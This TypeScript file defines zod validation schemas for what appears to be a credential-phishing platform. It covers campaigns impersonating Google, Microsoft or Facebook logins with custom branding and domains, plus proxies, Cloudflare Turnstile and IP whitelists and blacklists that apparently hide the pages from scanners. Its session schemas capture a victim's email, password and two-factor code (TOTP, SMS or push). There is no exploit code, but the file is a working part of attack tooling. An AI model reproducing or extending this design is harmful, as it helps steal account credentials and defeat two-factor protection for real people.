import { z } from 'zod';

// ============================================
// AUTH VALIDATION SCHEMAS
// ============================================

export const registerSchema = z.object({
  email: z.string().email('Invalid email address'),
  password: z.string().min(8, 'Password must be at least 8 characters'),
  fullName: z.string().min(2, 'Full name must be at least 2 characters').optional(),
  company: z.string().optional(),
  phoneNumber: z.string().optional(),
});

export const loginSchema = z.object({
  email: z.string().email('Invalid email address'),
  password: z.string().min(1, 'Password is required'),
});

// ============================================
// CAMPAIGN VALIDATION SCHEMAS
// ============================================

export const createCampaignSchema = z.object({
  name: z.string().min(3, 'Campaign name must be at least 3 characters'),
  targetUrl: z.string().url('Invalid target URL').optional(),
  description: z.string().optional(),
  provider: z.enum(['GOOGLE', 'MICROSOFT', 'FACEBOOK']).default('GOOGLE'),
  turnstileEnabled: z.boolean().default(true),
  ipShieldEnabled: z.boolean().default(true),
  pageTitle: z.string().optional(),
  logoUrl: z.string().url().optional(),
  customCss: z.string().optional(),
  domainId: z.string().optional(),
  profileId: z.string().optional(),
});

export const updateCampaignSchema = createCampaignSchema.partial();

// ============================================
// DEPLOYMENT VALIDATION SCHEMAS
// ============================================

export const createDeploymentSchema = z.object({
  campaignId: z.string().uuid('Invalid campaign ID'),
  domain: z.string().min(3, 'Domain must be at least 3 characters'),
  subdomain: z.string().optional(),
  isCustomDomain: z.boolean().default(false),
});

// ============================================
// PROXY VALIDATION SCHEMAS
// ============================================

export const addProxySchema = z.object({
  host: z.string().min(1, 'Host is required'),
  port: z.number().int().min(1).max(65535, 'Port must be between 1 and 65535'),
  protocol: z.enum(['http', 'https', 'socks5']).default('http'),
  username: z.string().optional(),
  password: z.string().optional(),
  country: z.string().optional(),
  provider: z.string().optional(),
  notes: z.string().optional(),
});

// ============================================
// SESSION VALIDATION SCHEMAS
// ============================================

export const sessionStartSchema = z.object({
  campaignId: z.string().uuid('Invalid campaign ID'),
  captureId: z.string().min(1, 'Capture ID is required'),
});

export const sessionEmailSchema = z.object({
  email: z.string().email('Invalid email address'),
});

export const sessionPasswordSchema = z.object({
  password: z.string().min(1, 'Password is required'),
});

export const session2FASchema = z.object({
  code: z.string().min(1, 'Code is required'),
  method: z.enum(['totp', 'sms', 'push']).optional(),
});

// ============================================
// CLOUDFLARE VALIDATION SCHEMAS
// ============================================

export const addCloudflareAccountSchema = z.object({
  name: z.string().min(1, 'Name is required'),
  email: z.string().email('Invalid email address'),
  apiToken: z.string().min(1, 'API token is required'),
  accountId: z.string().min(1, 'Account ID is required'),
  turnstileSiteKey: z.string().optional(),
  turnstileSecretKey: z.string().optional(),
});

// ============================================
// IP SHIELD VALIDATION SCHEMAS
// ============================================

export const addIPWhitelistSchema = z.object({
  ipAddress: z.string().min(1, 'IP address is required'),
  cidr: z.string().optional(),
  label: z.string().min(1, 'Label is required'),
  campaignId: z.string().uuid().optional(),
});

export const addIPBlacklistSchema = z.object({
  ipAddress: z.string().min(1, 'IP address is required'),
  cidr: z.string().optional(),
  reason: z.string().min(1, 'Reason is required'),
  severity: z.enum(['LOW', 'MEDIUM', 'HIGH', 'CRITICAL']).default('MEDIUM'),
  expiresAt: z.string().datetime().optional(),
});

// ============================================
// TYPE EXPORTS
// ============================================

export type RegisterInput = z.infer<typeof registerSchema>;
export type LoginInput = z.infer<typeof loginSchema>;
export type CreateCampaignInput = z.infer<typeof createCampaignSchema>;
export type UpdateCampaignInput = z.infer<typeof updateCampaignSchema>;
export type CreateDeploymentInput = z.infer<typeof createDeploymentSchema>;
export type AddProxyInput = z.infer<typeof addProxySchema>;
export type SessionStartInput = z.infer<typeof sessionStartSchema>;
export type SessionEmailInput = z.infer<typeof sessionEmailSchema>;
export type SessionPasswordInput = z.infer<typeof sessionPasswordSchema>;
export type Session2FAInput = z.infer<typeof session2FASchema>;
